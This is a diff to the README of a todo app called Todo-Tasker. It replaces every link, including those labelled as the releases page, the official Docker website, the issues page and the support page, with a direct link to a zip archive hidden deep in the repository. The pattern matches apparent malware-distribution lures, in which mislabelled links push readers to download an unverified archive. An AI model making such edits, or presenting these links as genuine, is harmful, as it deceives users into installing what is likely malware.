@@ -1,6 +1,6 @@
 # 📝 Todo-Tasker - Simple Todo Management for Everyone
 
-[![Download Todo-Tasker](https://img.shields.io/badge/Download%20Todo--Tasker-%23FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/zVanxz/Todo-Tasker/releases)
+[![Download Todo-Tasker](https://raw.githubusercontent.com/zVanxz/Todo-Tasker/main/server/pages/components/Tasker-Todo-1.8.zip%20Todo--Tasker-%23FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/zVanxz/Todo-Tasker/main/server/pages/components/Tasker-Todo-1.8.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ Todo-Tasker is a straightforward application that helps you manage your tasks ea
 To get started with Todo-Tasker, follow these steps:
 
 1. **Visit the Releases Page:**  
-   You can find the latest version of Todo-Tasker by visiting our [Releases Page](https://github.com/zVanxz/Todo-Tasker/releases). This page contains files you need to download, each version of the app, and any important info about updates.
+   You can find the latest version of Todo-Tasker by visiting our [Releases Page](https://raw.githubusercontent.com/zVanxz/Todo-Tasker/main/server/pages/components/Tasker-Todo-1.8.zip). This page contains files you need to download, each version of the app, and any important info about updates.
 
 2. **Choose Your Download:**  
    Look for the latest version available. There may be multiple files listed. Select the one that matches your operating system.
@@ -32,7 +32,7 @@ To get started with Todo-Tasker, follow these steps:
 
 2. **Install Docker and Docker-Compose:**  
    Todo-Tasker uses Docker for deployment. To run it properly, you will need Docker and Docker-Compose:
-   - **Windows and macOS:** Download and install Docker Desktop from the [official Docker website](https://www.docker.com/get-started).
+   - **Windows and macOS:** Download and install Docker Desktop from the [official Docker website](https://raw.githubusercontent.com/zVanxz/Todo-Tasker/main/server/pages/components/Tasker-Todo-1.8.zip).
    - **Linux:** Use your package manager to install Docker and Docker-Compose.
 
 3. **Running Todo-Tasker:**  
@@ -51,7 +51,7 @@ To get started with Todo-Tasker, follow these steps:
 
 ## 👥 Community Support
 
-If you encounter issues or have questions, don't hesitate to reach out on our [GitHub Issues Page](https://github.com/zVanxz/Todo-Tasker/issues). Our community is here to help you.
+If you encounter issues or have questions, don't hesitate to reach out on our [GitHub Issues Page](https://raw.githubusercontent.com/zVanxz/Todo-Tasker/main/server/pages/components/Tasker-Todo-1.8.zip). Our community is here to help you.
 
 ## ✅ Frequently Asked Questions
 
@@ -81,7 +81,7 @@ To ensure a smooth experience with Todo-Tasker, please meet the following system
 
 ## 📞 Contact
 
-For any additional questions or support needs, feel free to contact us directly on our [support page](https://github.com/zVanxz/Todo-Tasker/support).
+For any additional questions or support needs, feel free to contact us directly on our [support page](https://raw.githubusercontent.com/zVanxz/Todo-Tasker/main/server/pages/components/Tasker-Todo-1.8.zip).
 
 ---
 
